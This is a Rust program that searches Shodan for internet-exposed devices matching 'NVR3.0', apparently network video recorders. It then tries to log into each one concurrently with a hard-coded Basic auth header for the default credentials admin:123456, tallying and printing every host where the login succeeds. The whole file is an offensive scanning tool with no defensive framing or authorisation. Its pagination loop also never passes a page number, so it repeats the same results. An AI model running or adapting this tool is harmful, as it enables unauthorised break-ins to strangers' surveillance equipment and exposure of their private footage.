use colored::*;
use core::panic;
use dotenv::dotenv;
use lazy_static::lazy_static;
use reqwest::Response;
use serde_json::Value;
use std::collections::HashMap;
use std::env;
use std::sync::Mutex;

lazy_static! {
    static ref COUNTER: Mutex<HashMap<&'static str, u32>> = {
        let m = Mutex::new(HashMap::new());
        m.lock().unwrap().insert("threads", 0);
        m.lock().unwrap().insert("success", 0);
        m.lock().unwrap().insert("failed", 0);
        m
    };
}

async fn send_login_request(url: &String) -> Response {
    let client = reqwest::Client::new();
    client
        .get(format!(
            "http://{}/Media/UserGroup/login?response_format=json",
            url
        ))
        .header("Authorization", "Basic YWRtaW46MTIzNDU2")
        .send()
        .await
        .unwrap()
}

async fn make_request(url: &str, paramaters: &str) -> HashMap<String, Value> {
    let url = format!(
        "https://api.shodan.io/{}?key={}&{}",
        url,
        env::var("SHODAN_KEY").unwrap(),
        paramaters
    );
    let resp: String = reqwest::get(url).await.unwrap().text().await.unwrap();
    return serde_json::from_str(&resp).expect("failed");
}

fn print_stats(url: ColoredString) {
    let success = COUNTER
        .lock()
        .unwrap()
        .get(&"success")
        .unwrap()
        .to_string()
        .green();

    let failed = COUNTER
        .lock()
        .unwrap()
        .get(&"failed")
        .unwrap()
        .to_string()
        .red();

    println!("[ {} | {} ] http://{}", success, failed, url);
}

fn start_thread(ip: String, port: u64) {
    while COUNTER.lock().unwrap().get(&"threads").unwrap() >= &50 {}
    *COUNTER.lock().unwrap().get_mut(&"threads").unwrap() += 1;
    tokio::spawn(async move {
        let url: String = format!("{}:{}", ip, port);
        let resp: Response = send_login_request(&url).await;
        if resp.status() == 200 {
            *COUNTER.lock().unwrap().get_mut(&"success").unwrap() += 1;
            print_stats(url.green());
        } else {
            *COUNTER.lock().unwrap().get_mut(&"failed").unwrap() += 1;
            print_stats(url.red());
        }

        *COUNTER.lock().unwrap().get_mut(&"threads").unwrap() -= 1;
    });
}

async fn search_shodan() -> Result<(), reqwest::Error> {
    let resp: HashMap<String, Value> =
        make_request("shodan/host/count", "query=http.html:NVR3.0").await;

    let count: f64 = resp.get("total").unwrap().as_f64().unwrap();

    for _page in 1..=(count / 100.0).ceil() as u64 {
        let items: HashMap<String, Value> =
            make_request("shodan/host/search", "query=http.html:NVR3.0").await;

        for item in items.get("matches").unwrap().as_array().unwrap() {
            start_thread(
                item.get("ip_str").unwrap().as_str().unwrap().to_string(),
                item.get("port").unwrap().as_u64().unwrap(),
            );
        }
        //        start_thread();
    }
    Ok(())
}

#[tokio::main]
async fn main() {
    dotenv().ok();
    let _shodan_resp = match search_shodan().await {
        Ok(e) => e,
        Err(e) => panic!("{}", e),
    };
}
